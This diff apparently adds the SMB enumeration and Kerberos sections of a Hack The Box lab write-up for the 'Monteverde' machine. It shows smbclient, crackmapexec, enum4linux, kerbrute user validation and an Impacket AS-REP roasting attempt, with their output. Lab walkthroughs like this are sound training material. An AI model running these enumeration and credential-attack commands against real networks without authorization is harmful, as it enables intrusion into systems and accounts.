@@ -68,3 +68,101 @@ Host script results:
 |   3:1:1: 
 |_    Message signing enabled and required
 ```
+
+## SMB Enumeration
+
+Used `smbclient` which indicates anonymous logic is successful but no shares are returned.
+
+```bash
+smbclient -L //10.10.10.172 -N
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+```
+
+Used `crackmapexec` but can't enumerate any shares:
+
+```bash
+crackmapexec smb 10.10.10.172 --shares
+crackmapexec smb 10.10.10.172 -u '' -p '' --shares
+crackmapexec smb 10.10.10.172 -u 'guest' -p '' --shares
+```
+
+Used `enum4linux` to enumerate shares and was able to retrieve some users.
+
+```bash
+cat enum4linux.txt
+```
+
+Used `crackmapexec` to get a list of users:
+
+```bash
+crackmapexec smb 10.10.10.172 -u '' -p '' --users
+
+SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated domain user(s)
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\Guest                          Built-in account for guest access to the computer/domain                                                                                                                                    
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\AAD_987d7f2f57d2               Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.                                           
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\mhope                          
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\SABatchJobs                    
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-ata                        
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-bexec                      
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-netapp                     
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\dgalanos                       
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\roleary                        
+SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\smorgan
+```
+
+## Kerberos
+
+Use kerbrute to validate user list:
+
+```bash
+sudo /opt/kerbrute_linux_amd64 userenum --dc 10.10.10.172 -d MEGABANK.LOCAL -o kerbrute-user-enum /home/kali/Downloads/HackTheBox/Monteverde/userslist
+
+2024/06/29 15:44:26 >  [+] VALID USERNAME:       svc-ata@MEGABANK.LOCAL
+2024/06/29 15:44:26 >  [+] VALID USERNAME:       mhope@MEGABANK.LOCAL
+2024/06/29 15:44:26 >  [+] VALID USERNAME:       SABatchJobs@MEGABANK.LOCAL
+2024/06/29 15:44:26 >  [+] VALID USERNAME:       svc-bexec@MEGABANK.LOCAL
+2024/06/29 15:44:26 >  [+] VALID USERNAME:       AAD_987d7f2f57d2@MEGABANK.LOCAL
+2024/06/29 15:44:26 >  [+] VALID USERNAME:       svc-netapp@MEGABANK.LOCAL
+2024/06/29 15:44:26 >  [+] VALID USERNAME:       dgalanos@MEGABANK.LOCAL
+2024/06/29 15:44:26 >  [+] VALID USERNAME:       roleary@MEGABANK.LOCAL
+2024/06/29 15:44:26 >  [+] VALID USERNAME:       smorgan@MEGABANK.LOCAL
+```
+
+ASREPRoasting with Impacket:
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGABANK.LOCAL/ -dc-ip 10.10.10.172 -usersfile userslist -no-pass -request -outputfile kerberos-users-found
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
